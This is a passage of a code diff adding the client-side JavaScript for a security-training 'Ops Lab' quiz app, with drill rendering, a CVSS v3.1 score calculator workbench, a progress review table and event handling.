+  TRACKS.forEach(function(t){
+    var ds = DRILLS.filter(function(d){ return d.tr === t.id; }), done = ds.filter(function(d){ return S.att[d.id] && S.att[d.id].n; }).length;
+    h += '<div class="track tc-' + t.id + '"><span class="n">Lab ' + t.n + ' &middot; ' + esc(t.tag) + '</span><h2>' + esc(t.name) + '</h2><p>' + esc(t.desc) + '</p>' +
+      '<span class="meta">Objectives ' + esc(t.obj) + ' &middot; ' + done + ' / ' + ds.length + ' attempted</span>' +
+      '<div class="bar"><i style="width:' + Math.round(100 * done / ds.length) + '%"></i></div>' +
+      '<button class="btn" type="button" data-go="track:' + t.id + '">Open lab &rarr;</button></div>';
+  });
+  app.innerHTML = h + '</div>';
+}
+
+/* ---------- practice ---------- */
+var P = null;  // {ids, i, label}
+function startSet(ids, label, at){ P = {ids:ids, i:at || 0, label:label}; show(); }
+function begin(go){
+  if (go === 'mixed'){
+    var fresh = shuffle(DRILLS.filter(function(d){ return !(S.att[d.id] && S.att[d.id].n); }).map(function(d){ return d.id; }));
+    var rest = shuffle(DRILLS.filter(function(d){ return S.att[d.id] && S.att[d.id].n; }).map(function(d){ return d.id; }));
+    startSet(fresh.concat(rest).slice(0, 12), 'Mixed practice');
+  } else if (go === 'retry'){ var r = retryIds(); if (r.length) startSet(r, 'Retry queue'); }
+  else if (go.indexOf('track:') === 0){ var t = go.slice(6); startSet(DRILLS.filter(function(d){ return d.tr === t; }).map(function(d){ return d.id; }), TBY[t].name); }
+}
+var CUR = null;  // current showing: {d, perm, pick, order, checked}
+function show(){
+  setNav('');
+  var d = BY[P.ids[P.i]];
+  CUR = {d:d, pick:(d.ty === 'multi' ? [] : null), checked:false};
+  if (d.ty === 'single' || d.ty === 'multi' || d.ty === 'score') CUR.perm = shuffle(range(d.opts.length));
+  if (d.ty === 'order'){ var o; do { o = shuffle(range(d.opts.length)); } while (o.join() === range(d.opts.length).join()); CUR.order = o; }
+  draw();
+}
+function artHTML(d){
+  var h = '<div class="term"><div class="tt">' + esc(d.artT) + '</div>';
+  if (d.ty === 'line'){
+    h += '<div class="lines" role="group" aria-label="Log lines">';
+    d.art.forEach(function(l, i){
+      var cls = '', why = '';
+      if (CUR.checked){ if (i === d.ans) cls = 'right'; else if (i === CUR.pick) cls = 'wrong';
+        if (d.lw && d.lw[i]) why = '<span class="lw">' + esc(d.lw[i]) + '</span>'; }
+      h += '<button type="button" class="' + cls + '" data-line="' + i + '" aria-pressed="' + (CUR.pick === i) + '"' + (CUR.checked ? ' disabled' : '') + '>' + esc(l) + '</button>' + why;
+    });
+    h += '</div>';
+  } else h += '<pre>' + esc(d.art) + '</pre>';
+  return h + '</div>';
+}
+function optsHTML(d){
+  var letters = 'ABCDEF', h = '<div class="opts" role="group" aria-label="Answer options">';
+  CUR.perm.forEach(function(oi, k){
+    var picked = d.ty === 'multi' ? CUR.pick.indexOf(oi) >= 0 : CUR.pick === oi;
+    var right = d.ty === 'multi' ? d.ans.indexOf(oi) >= 0 : d.ans === oi;
+    var cls = '', tag = '';
+    if (CUR.checked){ if (right) { cls = ' right'; tag = picked ? 'Correct' : (d.ty === 'multi' ? 'Missed' : 'Answer'); } else if (picked) { cls = ' wrong'; tag = 'Wrong'; } }
+    h += '<button type="button" class="opt' + cls + '" data-opt="' + oi + '" aria-pressed="' + picked + '"' + (CUR.checked ? ' disabled' : '') + '>' +
+      '<span class="k">' + (d.ty === 'multi' ? (picked ? '&#10003;' : '&nbsp;') : letters[k]) + '</span><span>' + esc(d.opts[oi][0]) +
+      (CUR.checked ? '<span class="why">' + esc(d.opts[oi][1]) + '</span>' : '') + '</span>' + (tag ? '<span class="tag">' + tag + '</span>' : '') + '</button>';
+  });
+  return h + '</div>';
+}
+function orderHTML(d){
+  var h = '<ol class="order">';
+  CUR.order.forEach(function(oi, pos){
+    var cls = CUR.checked ? (oi === pos ? ' right' : ' wrong') : '';
+    h += '<li class="orow' + cls + '"><span class="nn">' + (pos + 1) + '</span><span class="tx">' + esc(d.opts[oi][0]) +
+      (CUR.checked ? '<span class="why">' + (oi === pos ? '' : 'Belongs in position ' + (oi + 1) + '. ') + esc(d.opts[oi][1]) + '</span>' : '') + '</span>' +
+      '<button type="button" data-up="' + pos + '" aria-label="Move up"' + (pos === 0 || CUR.checked ? ' disabled' : '') + '>&uarr;</button>' +
+      '<button type="button" data-dn="' + pos + '" aria-label="Move down"' + (pos === CUR.order.length - 1 || CUR.checked ? ' disabled' : '') + '>&darr;</button></li>';
+  });
+  return h + '</ol>';
+}
+var SEVS = ['None','Low','Medium','High','Critical'];
+function scoreHTML(d){
+  var r = CVSS.score(CVSS.parse(d.vec)), sc = CUR.score || {}, okS = CUR.checked && parseFloat(sc.v) === r.base, okV = CUR.checked && sc.s === r.sev;
+  return '<div class="scorein"><label>Base score (0.0&ndash;10.0)<input id="sv" type="number" step="0.1" min="0" max="10" inputmode="decimal" value="' + esc(sc.v || '') + '"' +
+    (CUR.checked ? ' disabled class="' + (okS ? 'right' : 'wrong') + '"' : '') + '></label>' +
+    '<label>Severity<select id="ss"' + (CUR.checked ? ' disabled class="' + (okV ? 'right' : 'wrong') + '"' : '') + '><option value="">Choose&hellip;</option>' +
+    SEVS.map(function(s){ return '<option' + (sc.s === s ? ' selected' : '') + '>' + s + '</option>'; }).join('') + '</select></label></div>' +
+    '<p class="subh">Interpret the metric</p>';
+}
+function breakdown(vec){
+  var m = CVSS.parse(vec), r = CVSS.score(m);
+  var names = {AV:{N:'Network',A:'Adjacent',L:'Local',P:'Physical'},AC:{L:'Low',H:'High'},PR:{N:'None',L:'Low',H:'High'},UI:{N:'None',R:'Required'},S:{U:'Unchanged',C:'Changed'},C:{H:'High',L:'Low',N:'None'},I:{H:'High',L:'Low',N:'None'},A:{H:'High',L:'Low',N:'None'}};
+  var h = '<p><b>Base ' + r.base.toFixed(1) + ' &middot; ' + r.sev + '</b> &nbsp; Impact ' + r.impact.toFixed(2) + ' &nbsp; Exploitability ' + r.exploit.toFixed(2) + '</p><div class="brk">';
+  ['AV','AC','PR','UI','S','C','I','A'].forEach(function(k){ h += '<span>' + k + ':' + m[k] + ' &middot; ' + names[k][m[k]] + '</span>'; });
+  return h + '</div>';
+}
+function isCorrect(d){
+  if (d.ty === 'single') return CUR.pick === d.ans;
+  if (d.ty === 'multi') return CUR.pick.length === d.ans.length && d.ans.every(function(a){ return CUR.pick.indexOf(a) >= 0; });
+  if (d.ty === 'order') return CUR.order.join() === range(d.opts.length).join();
+  if (d.ty === 'line') return CUR.pick === d.ans;
+  if (d.ty === 'score'){ var r = CVSS.score(CVSS.parse(d.vec)); return parseFloat(CUR.score.v) === r.base && CUR.score.s === r.sev && CUR.pick === d.ans; }
+}
+function ready(d){
+  if (d.ty === 'multi') return CUR.pick.length > 0;
+  if (d.ty === 'order') return true;
+  if (d.ty === 'score') return CUR.pick !== null && CUR.score && CUR.score.v !== '' && CUR.score.s;
+  return CUR.pick !== null;
+}
+function draw(){
+  var d = CUR.d, t = TBY[d.tr];
+  var h = '<p class="eyebrow">' + esc(P.label) + '</p><div class="play"><div class="card drill tc-' + d.tr + '">' +
+    '<div class="dmeta"><span class="chip tr">' + esc(t.name) + '</span><span class="chip">Obj ' + esc(d.o) + '</span><span class="chip">' + esc(d.diff) + '</span>' +
+    '<span class="chip pos">' + (P.i + 1) + ' / ' + P.ids.length + '</span></div>' +
+    '<h2>' + esc(d.title) + '</h2><p class="brief">' + esc(d.brief) + '</p>' + artHTML(d) +
+    (d.ty === 'score' ? scoreHTML(d) : '') + '<p class="prompt">' + esc(d.prompt) + (d.ty === 'multi' ? ' <span class="hint">(select all that apply)</span>' : '') + '</p>' +
+    (d.ty === 'order' ? orderHTML(d) : d.ty === 'line' ? '' : optsHTML(d));
+  if (!CUR.checked){
+    h += '<div class="check"><button class="btn primary" type="button" id="chk">Check answer</button><span class="hint" id="chkmsg"></span></div>';
+  } else {
+    var ok = CUR.ok;
+    h += '<div class="fb ' + (ok ? 'ok' : 'no') + '"><h3>' + (ok ? 'Correct.' : 'Not this time &mdash; it&rsquo;s in your retry queue.') + '</h3>' +
+      (d.ty === 'score' ? breakdown(d.vec) : '') + '<p>' + esc(d.explain) + '</p><p class="keep"><b>Keep this</b>' + esc(d.keep) + '</p>' +
+      '<a href="' + NB + '#t=' + encodeURIComponent(d.nb) + '">Read the Notebook topic &rarr;</a></div>' +
+      '<div class="check">' + (P.i < P.ids.length - 1 ? '<button class="btn primary" type="button" id="next">Next drill &rarr;</button>' : '<button class="btn primary" type="button" data-view="review">Finish &amp; review</button>') +
+      '<button class="btn" type="button" id="again">Try this one again</button></div>';
+  }
+  h += '</div><aside class="side"><div class="card"><h3>This set</h3><div class="dots">';
+  P.ids.forEach(function(id, i){ var a = S.att[id], c = i === P.i ? ' cur' : a && a.n ? (a.last ? ' ok' : ' no') : '';
+    h += '<button type="button" class="' + c.trim() + '" data-jump="' + i + '" aria-label="Drill ' + (i + 1) + '">' + (i + 1) + '</button>'; });
+  var tt = totals();
+  h += '</div></div><div class="card"><h3>Session</h3><div class="kv">Attempted <b>' + tt.att + ' / ' + DRILLS.length + '</b></div>' +
+    '<div class="kv">First-try accuracy <b>' + pct(tt.firstOk, tt.att) + '</b></div><div class="kv">Retry queue <b>' + tt.retry + '</b></div>' +
+    '<button class="linkbtn" type="button" data-view="review">Open review &rarr;</button></div>' +
+    '<div class="card"><h3>Objective ' + esc(d.o) + '</h3><p class="hint" style="margin:0">' + esc(OBJT[d.o] || '') + '</p></div></aside></div>';
+  app.innerHTML = h;
+  if (d.ty === 'score' && !CUR.checked){
+    var sv = document.getElementById('sv'), ss = document.getElementById('ss');
+    CUR.score = CUR.score || {v:'', s:''};
+    sv.addEventListener('input', function(){ CUR.score.v = sv.value; });
+    ss.addEventListener('change', function(){ CUR.score.s = ss.value; });
+  }
+}
+function check(){
+  var d = CUR.d;
+  if (d.ty === 'score'){ CUR.score = {v:document.getElementById('sv').value.trim(), s:document.getElementById('ss').value}; }
+  if (!ready(d)){ document.getElementById('chkmsg').textContent = d.ty === 'score' ? 'Enter a score, pick a severity and choose an interpretation.' : d.ty === 'line' ? 'Click a line first.' : 'Choose an answer first.'; return; }
+  CUR.ok = !!isCorrect(d); CUR.checked = true; record(d, CUR.ok); draw();
+  var fb = document.querySelector('.fb'); if (fb && fb.scrollIntoView) fb.scrollIntoView({block:'nearest'});
+}
+
+/* ---------- workbench ---------- */
+var BM = CVSS.parse('CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N');
+var MET = [['AV','Attack Vector',[['N','Network'],['A','Adjacent'],['L','Local'],['P','Physical']]],['AC','Attack Complexity',[['L','Low'],['H','High']]],
+  ['PR','Privileges Required',[['N','None'],['L','Low'],['H','High']]],['UI','User Interaction',[['N','None'],['R','Required']]],
+  ['S','Scope',[['U','Unchanged'],['C','Changed']]],['C','Confidentiality',[['N','None'],['L','Low'],['H','High']]],
+  ['I','Integrity',[['N','None'],['L','Low'],['H','High']]],['A','Availability',[['N','None'],['L','Low'],['H','High']]]];
+function bench(){
+  setNav('bench');
+  var h = '<p class="eyebrow">CVSS v3.1 &middot; Workbench &middot; ungraded</p><h1>Decode a vector</h1><p class="lede">Paste a Base vector or change any metric. The score, subscores and working update immediately.</p>' +
+    '<div class="bench" style="margin-top:18px"><div class="card"><div class="vecrow"><input id="vin" spellcheck="false" aria-label="CVSS vector" value="' + CVSS.vector(BM) + '">' +
+    '<button class="btn primary" type="button" id="vload">Load</button></div><div class="err" id="verr"></div><p class="subh">Lesson vectors</p><div class="vecrow">';
+  DRILLS.filter(function(d){ return d.ty === 'score'; }).forEach(function(d){ h += '<button class="btn" type="button" data-vec="' + d.vec + '">' + esc(d.title) + '</button>'; });
+  h += '</div><p class="subh">Base metrics</p><div class="metrics">';
+  MET.forEach(function(m){ h += '<label>' + m[1] + ' <span>' + m[0] + '</span><select data-m="' + m[0] + '">' +
+    m[2].map(function(o){ return '<option value="' + o[0] + '"' + (BM[m[0]] === o[0] ? ' selected' : '') + '>' + o[1] + ' (' + o[0] + ')</option>'; }).join('') + '</select></label>'; });
+  h += '</div><details class="calc"><summary>Show the calculation</summary><pre id="calc"></pre></details></div><div class="scorebox" id="sbox" aria-live="polite"></div></div>';
+  app.innerHTML = h; benchOut();
+}
+function benchOut(){
+  var r = CVSS.score(BM), W = CVSS.W, pr = CVSS.prw(BM.PR, BM.S);
+  document.getElementById('sbox').innerHTML = '<div class="subh" style="color:#8a9aa6">CVSS v3.1 Base score</div><div class="big">' + r.base.toFixed(1) + '<small> / 10</small></div>' +
+    '<span class="sevpill sev-' + r.sev + '">' + r.sev + '</span>' +
+    '<div class="row"><span>Impact subscore</span><span>' + (r.impact > 0 ? r.impact.toFixed(4) : '0 (no impact)') + '</span></div>' +
+    '<div class="row"><span>Exploitability</span><span>' + r.exploit.toFixed(4) + '</span></div>' +
+    '<div class="row"><span>Scope</span><span>' + (BM.S === 'C' ? 'Changed' : 'Unchanged') + '</span></div><code>' + CVSS.vector(BM) + '</code>';
+  document.getElementById('calc').textContent =
+    'ISS = 1 - (1-C)(1-I)(1-A) = 1 - (1-' + W.C[BM.C] + ')(1-' + W.I[BM.I] + ')(1-' + W.A[BM.A] + ') = ' + r.iss.toFixed(4) + '\n' +
+    (BM.S === 'U' ? 'Impact = 6.42 x ISS = ' : 'Impact = 7.52 x (ISS - 0.029) - 3.25 x (ISS - 0.02)^15 = ') + r.impact.toFixed(4) + '\n' +
+    'Exploitability = 8.22 x AV ' + W.AV[BM.AV] + ' x AC ' + W.AC[BM.AC] + ' x PR ' + pr + (BM.S === 'C' && BM.PR !== 'N' ? ' (Scope Changed weight)' : '') + ' x UI ' + W.UI[BM.UI] + ' = ' + r.exploit.toFixed(4) + '\n' +
+    (r.impact <= 0 ? 'Impact <= 0, so Base = 0' : BM.S === 'U' ? 'Base = Roundup(min(Impact + Exploitability, 10)) = ' + r.base.toFixed(1)
+       : 'Base = Roundup(min(1.08 x (Impact + Exploitability), 10)) = ' + r.base.toFixed(1)) +
+    '\nRoundup = smallest one-decimal number >= the value (so 6.41 becomes 6.5).';
+  var vin = document.getElementById('vin'); if (vin && document.activeElement !== vin) vin.value = CVSS.vector(BM);
+}
+
+/* ---------- review ---------- */
+var RF = 'all';
+function review(){
+  setNav('review');
+  var h = '<p class="eyebrow">Your progress</p><h1>Review</h1><p class="lede">First attempts show where you started. Latest answers show where you are now. Accuracy by objective counts every answer, so it moves as you retry.</p>' + statsHTML();
+  h += '<div class="actions"><button class="btn primary" type="button" data-go="retry"' + (retryIds().length ? '' : ' disabled') + '>Retry missed (' + retryIds().length + ')</button></div>';
+  h += '<h2 class="sec">Accuracy by objective</h2><div class="objacc">';
+  var objs = Object.keys(OBJT).filter(function(o){ return DRILLS.some(function(d){ return d.o === o; }); });
+  objs.forEach(function(o){ var s = S.obj[o], p = s && s.t ? Math.round(100 * s.c / s.t) : null;
+    h += '<div class="oa"><span class="c">' + o + '</span><span class="t" title="' + esc(OBJT[o]) + '">' + esc(OBJT[o]) + '</span><span class="p' + (p !== null && p < 70 ? ' low' : '') + '">' +
+      (p === null ? 'not drilled' : p + '% of ' + s.t) + '</span></div>'; });
+  h += '</div><h2 class="sec">Every drill</h2><div class="filters" role="group" aria-label="Filter">';
+  [['all','All'],['retry','Needs retry'],['rec','Recovered'],['new','Not attempted']].forEach(function(f){ h += '<button type="button" data-rf="' + f[0] + '" aria-pressed="' + (RF === f[0]) + '">' + f[1] + '</button>'; });
+  h += '</div><div class="tblwrap"><table class="rv"><thead><tr><th>Drill</th><th>Track</th><th>First</th><th>Latest</th><th></th></tr></thead><tbody>';
+  DRILLS.forEach(function(d){
+    var a = S.att[d.id] || {n:0}, isNew = !a.n, isRetry = a.n && !a.last, isRec = a.n && !a.first && a.last;
+    if (RF === 'retry' && !isRetry || RF === 'rec' && !isRec || RF === 'new' && !isNew) return;
+    var f = isNew ? '<span class="st na">Not attempted</span>' : a.first ? '<span class="st ok">Right</span>' : '<span class="st no">Missed</span>';
+    var l = isNew ? '' : isRec ? '<span class="st rec">Recovered</span>' : a.last ? '<span class="st ok">Right</span>' : '<span class="st no">Needs retry</span>';
+    h += '<tr><td class="t"><b>' + esc(d.title) + '</b><span>Obj ' + d.o + (a.n ? ' &middot; ' + a.n + ' attempt' + (a.n === 1 ? '' : 's') : '') + '</span></td><td>' + esc(TBY[d.tr].name) +
+      '</td><td>' + f + '</td><td>' + l + '</td><td><button class="linkbtn" type="button" data-open="' + d.id + '">' + (isNew ? 'Try' : 'Retry') + ' &rarr;</button></td></tr>';
+  });
+  h += '</tbody></table></div><div class="actions" style="margin-top:20px"><button class="btn" type="button" id="reset">Reset Ops Lab progress</button><span class="hint" id="resetmsg"></span></div>';
+  app.innerHTML = h;
+}
+
+/* ---------- events ---------- */
+var resetArmed = false;
+app.addEventListener('click', function(e){
+  var b = e.target.closest('button'); if (!b || b.disabled) return;
+  var v;
+  if ((v = b.getAttribute('data-go'))) return begin(v);
+  if ((v = b.getAttribute('data-view'))) return route(v);
+  if (b.id === 'chk') return check();
+  if (b.id === 'next'){ P.i++; return show(); }
+  if (b.id === 'again'){ return show(); }
+  if ((v = b.getAttribute('data-jump')) !== null){ P.i = +v; return show(); }
+  if ((v = b.getAttribute('data-open'))){ var d = BY[v]; return startSet(DRILLS.filter(function(x){ return x.tr === d.tr; }).map(function(x){ return x.id; }), TBY[d.tr].name, DRILLS.filter(function(x){ return x.tr === d.tr; }).map(function(x){ return x.id; }).indexOf(v)); }
+  if ((v = b.getAttribute('data-opt')) !== null){ v = +v;
+    if (CUR.d.ty === 'multi'){ var i = CUR.pick.indexOf(v); if (i >= 0) CUR.pick.splice(i, 1); else CUR.pick.push(v); } else CUR.pick = v;
+    return draw(); }
+  if ((v = b.getAttribute('data-line')) !== null){ CUR.pick = +v; return draw(); }
+  if ((v = b.getAttribute('data-up')) !== null){ v = +v; var o = CUR.order, t = o[v]; o[v] = o[v-1]; o[v-1] = t; return draw(); }
+  if ((v = b.getAttribute('data-dn')) !== null){ v = +v; var o2 = CUR.order, t2 = o2[v]; o2[v] = o2[v+1]; o2[v+1] = t2; return draw(); }
+  if ((v = b.getAttribute('data-vec'))){ BM = CVSS.parse(v); return bench(); }
+  if (b.id === 'vload'){ var m = CVSS.parse(document.getElementById('vin').value.trim());
+    document.getElementById('verr').textContent = m ? '' : 'Not a complete CVSS v3.1 Base vector (needs AV, AC, PR, UI, S, C, I and A).';
+    if (m){ BM = m; bench(); } return; }
+  if ((v = b.getAttribute('data-rf'))){ RF = v; return review(); }
+  if (b.id === 'reset'){
+    if (!resetArmed){ resetArmed = true; b.textContent = 'Click again to erase all Ops Lab progress'; document.getElementById('resetmsg').textContent = 'This cannot be undone.'; return; }
+    S = {att:{}, obj:{}}; save(); resetArmed = false; return review();
+  }
+});
+app.addEventListener('change', function(e){
+  var m = e.target.getAttribute && e.target.getAttribute('data-m');
+  if (m){ BM[m] = e.target.value; benchOut(); }
+});
+app.addEventListener('keydown', function(e){ if (e.target.id === 'vin' && e.key === 'Enter') document.getElementById('vload').click(); });
+document.querySelector('.nav').addEventListener('click', function(e){ var b = e.target.closest('button'); if (b) route(b.getAttribute('data-view')); });
+function route(v){ resetArmed = false; if (v === 'bench') bench(); else if (v === 'review') review(); else home(); window.scrollTo(0, 0); }
+// deep links: #d=<drill id>, #bench, #review, #track=<id>
+function deeplink(){
+  var h = location.hash || '', m;
+  if ((m = /^#d=(.+)$/.exec(h)) && BY[decodeURIComponent(m[1])]){ var d = BY[decodeURIComponent(m[1])];
+    var ids = DRILLS.filter(function(x){ return x.tr === d.tr; }).map(function(x){ return x.id; }); return startSet(ids, TBY[d.tr].name, ids.indexOf(d.id)); }
+  if ((m = /^#track=(.+)$/.exec(h)) && TBY[m[1]]) return begin('track:' + m[1]);
+  if (h === '#bench') return route('bench');
+  if (h === '#review') return route('review');
+  home();
+}
+deeplink();
+window.addEventListener('hashchange', deeplink);
+window.OPS = {S:function(){ return S; }, CUR:function(){ return CUR; }, P:function(){ return P; }};
+})();
+</script>
+</body>
+</html>
